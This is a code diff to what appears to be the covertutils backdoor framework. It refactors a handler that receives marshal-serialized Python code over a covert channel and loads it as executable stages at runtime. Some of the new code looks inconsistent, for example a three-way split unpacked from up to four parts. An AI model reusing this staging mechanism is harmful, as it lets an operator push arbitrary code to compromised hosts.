@@ -8,6 +8,20 @@ from covertutils.payloads import CommonStages
 from covertutils.helpers import defaultArgMerging
 
 
+def stager_worker( storage, message ) :
+
+	handler = storage['COMMON']['handler']
+	stream, action, stage_obj = message.split( ':', 3 )
+	handler.addStage( stream, stage_obj )
+	return stream
+
+stager_stage = {}
+stager_stage['work'] = stager_worker.func_code
+stager_stage['init'] = None
+
+stage_obj = marshal.dumps(stager_stage)
+
+
 class StageableHandler ( FunctionDictHandler ) :
 	"""
 The StageableHandler is a :class:`covertutils.handlers.FunctionDictHandler` that can load payloads (stages) during execution. Additional functions can be sent in a serialized form (ready stages can be found in :mod:`covertutils.payloads`).
@@ -16,10 +30,10 @@ The stage function have to be implemented according to :class:`covertutils.handl
 To running `StageableHandler`s, additional functions can be packed with the :func:covertutils.handlers.`StageableHandler.createStageMessage` and sent like normal messages with a `sendAdHoc` call.
 """
 
-	__delimiter = ':'
-	__add_action = "A"
-	__replace_action = "R"
-	__delete_action = "D"
+	Delimiter = ':'
+	Add_Action = "A"
+	Replace_Action = "R"
+	Delete_Action = "D"
 
 	Defaults = { 'stage_stream' : 'stage' }
 
@@ -27,39 +41,28 @@ To running `StageableHandler`s, additional functions can be packed with the :fun
 		"""
 :param str stage_stream: The stream where all stages will be received.
 		"""
-		super(StagableHandler, self).__init__( recv, send, orchestrator, **kw )
+		super(StageableHandler, self).__init__( recv, send, orchestrator, **kw )
 
 		arguments = defaultArgMerging( self.Defaults, kw )
 		self.stage_stream = arguments['stage_stream']
 
-		if  self.stage_stream not in self.orchestrator.getStream() :
-			self.orchestrator.addStream( self.stage_stream )
+		self.addStage( self.stage_stream, stage_obj )
+		# print orchestrator.streams_buckets[self.stage_stream]
+		# if  self.stage_stream not in self.orchestrator.getStream() :
+		# 	self.orchestrator.addStream( self.stage_stream )
 
 
 	def onMessage( self, stream, message ) :
-		super( StagableHandler, self ).onMessage( stream, message )
+		return super( StageableHandler, self ).onMessage( stream, message )
 		# if stream in self.function_dict.keys() :
 		# 	self.function_dict[ stream ]( message )
 		# else :
 		# 	raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )
 
 
-	def __staging( self, message ) :
-		stream_name, action, serialized_function = message.split( self.__delimiter, 2 )
-		function_code = marshal.loads( serialized_function )
-		function = types.FunctionType(function_code, globals(), stream_name+"_handle")
-		if action == self.__add_action :
-			self.orchestrator.addStream( stream_name )
-			self.function_dict[ stream ] = function
-		elif action == self.__delete_action :
-			self.orchestrator.deleteStream( stream_name )
-			del self.function_dict[ stream ]
-		elif action == self.__replace_action :
-			self.function_dict[ stream ] = function
 
-
-
-	def createStageMessage( self, stream, serialized_function, replace = True ) :
+	@staticmethod
+	def createStageMessage( stream, stage_obj, replace = True ) :
 		"""
 :param str stream: The stream where the new stage will receive messages from.
 :param str serialized_function: The stage-function serialized with the `marshal` build-in package.
@@ -68,5 +71,5 @@ To running `StageableHandler`s, additional functions can be packed with the :fun
 		action = 'A'
 		if replace :
 			action = 'R'
-		message = stream + StageableHandler.__delimiter + action + StageableHandler.__delimiter + serialized_function
+		message = stream + StageableHandler.Delimiter + action + StageableHandler.Delimiter + stage_obj
 		return message
